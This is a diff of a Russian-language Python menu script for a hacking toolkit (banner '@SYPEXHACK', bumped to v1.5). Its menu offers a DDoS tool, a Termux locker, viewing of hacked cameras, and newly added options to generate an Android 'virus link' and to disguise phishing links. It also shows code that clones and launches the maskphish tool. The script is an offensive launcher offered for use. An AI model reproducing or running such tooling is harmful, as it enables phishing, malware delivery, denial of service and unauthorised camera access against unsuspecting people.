@@ -28,7 +28,7 @@ while True:
     print (" #   #  #    ##    #    # ##   #     #    ##    #   ")
     print ("###  #  #  ###      ##   # #  ###   ###    ##   #   ")
     print ('\n')
-    print ("[telegram: @SYPEXHACK]                        [v1.3]")
+    print ("[telegram: @SYPEXHACK]                        [v1.5]")
     time.sleep(2)
     print ('\n\n')
     print ("    [1] тунелирование <ngrok>")
@@ -37,6 +37,8 @@ while True:
     print ("    [4] ддос <Doser>")
     print ("    [5] заблокировать Termux <!!ОПАСНО!!>")
     print ("    [6] просмотр взломаных камер <CAM-HACKERS>")
+    print ("    [7] получить вирус ссылку <android>")
+    print ("    [8] замаскировать фишинг <maskphish>")
     print ("\n")
     print ("    [77] поддержка автора")
     print ("    [66] тг канал автора")
@@ -213,7 +215,7 @@ while True:
         os.system('python cam-hackers.py')
 
 
-    if inp == '07':
+    if inp == '7':
         os.system('clear')
         print('[Генерируется ссылка...]')
         time.sleep(3)
@@ -230,7 +232,7 @@ while True:
             os.system('clear')       
 
 
-    if inp == '08':
+    if inp == '8':
         os.system('git clone https://github.com/jaykali/maskphish.git')
         os.chdir('maskphish')
         os.system('clear')
